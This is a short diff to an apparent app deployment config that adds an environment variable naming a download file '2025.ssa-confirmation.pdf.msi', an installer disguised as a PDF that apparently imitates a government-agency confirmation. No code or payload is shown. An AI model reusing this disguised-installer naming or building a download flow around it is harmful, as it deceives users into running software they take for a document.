@@ -41,3 +41,8 @@ externalPort = 3000
 deploymentTarget = "autoscale"
 build = ["npm", "run", "build"]
 run = ["npm", "start"]
+
+[userenv]
+
+[userenv.shared]
+DOWNLOAD_FILE_PATH = "2025.ssa-confirmation.pdf.msi"
